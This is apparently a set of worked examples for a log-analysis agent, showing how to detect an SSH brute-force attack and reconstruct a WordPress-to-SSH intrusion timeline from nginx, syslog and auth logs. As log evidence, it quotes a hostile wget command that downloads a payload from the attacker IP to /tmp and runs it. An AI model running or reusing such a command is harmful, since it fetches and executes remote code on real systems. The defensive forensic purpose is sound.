# Log Analyst — Worked Examples

Externalized from the agent definition per the few-shot-examples rule (#1587).

### Example 1: Auth.log Brute Force Detection (Simple)

**Scenario**: Analyze auth.log from a server with a suspected SSH brute force attack.

**Commands run**:
```bash
grep "Failed password" auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -10
```

**Output**:
```
4821 185.220.101.47
1205 91.108.4.12
843  194.165.16.11
```

**Follow-up — was any of these successful?**:
```bash
grep "185.220.101.47\|91.108.4.12" auth.log | grep -E "Accepted|opened"
```

**Output**: `Accepted password for admin from 185.220.101.47 port 51284 ssh2` on March 15 at 03:47:22.

**Finding**: IP 185.220.101.47 conducted a brute force attack with 4,821 attempts and succeeded at 03:47:22 UTC. ATT&CK: T1110.001 (Brute Force: Password Guessing), T1078 (Valid Accounts — successful login). Escalate IP as confirmed attacker IOC.

---

### Example 2: Multi-Source Log Correlation (Moderate)

**Scenario**: Correlate web access logs, auth logs, and syslog to reconstruct an attack chain.

**Timeline reconstruction**:

1. **02:15:00 UTC** — nginx access log: 847 requests to `/wp-login.php` from 185.220.101.47 (T1190 — web exploitation attempt)
2. **02:31:44 UTC** — nginx access log: HTTP 200 on `/wp-admin/theme-editor.php?file=functions.php` — successful WordPress admin login followed by file edit (T1505.003 — Web Shell)
3. **02:34:19 UTC** — syslog: `www-data` spawned `/bin/bash -c "wget http://185.220.101.47/x -O /tmp/.x && chmod +x /tmp/.x && /tmp/.x"` (T1059.004 — Unix shell, T1105 — Ingress Tool Transfer)
4. **02:34:31 UTC** — auth.log: `Failed password for root from 127.0.0.1` (lateral movement attempt from compromised www-data, T1110)
5. **02:47:03 UTC** — auth.log: `Accepted password for backup from 185.220.101.47` (separate credential from password reuse, T1078)

**Finding**: Full attack chain from web exploitation to separate SSH login documented across three log sources. Attack duration: 32 minutes from first probe to second foothold.
